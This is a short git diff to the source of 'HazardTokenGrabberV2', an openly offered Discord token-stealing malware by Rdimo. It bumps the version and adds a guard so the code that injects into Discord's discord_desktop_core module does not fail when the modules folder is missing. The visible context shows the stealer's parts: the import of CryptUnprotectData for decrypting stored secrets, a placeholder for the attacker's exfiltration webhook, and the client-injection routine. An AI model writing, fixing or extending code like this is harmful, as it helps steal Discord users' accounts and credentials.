@@ -21,7 +21,7 @@ from tempfile import mkdtemp, gettempdir
 from win32crypt import CryptUnprotectData
 
 __author__ = "Rdimo"
-__version__ = '1.8.2'
+__version__ = '1.8.3'
 __license__ = "GPL-3.0"
 __config__ = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
@@ -252,6 +252,8 @@ class HazardTokenGrabberV2(Functions):
                     if re.match(r'app-(\d*\.\d*)*', __dir):
                         app = ntpath.abspath(ntpath.join(discord, __dir))
                         modules = ntpath.join(app, 'modules')
+                        if not ntpath.exists(modules):
+                            return
                         for ___dir in os.listdir(modules):
                             if re.match(r"discord_desktop_core-\d+", ___dir):
                                 inj_path = modules + os.sep + ___dir + f'\\discord_desktop_core\\'
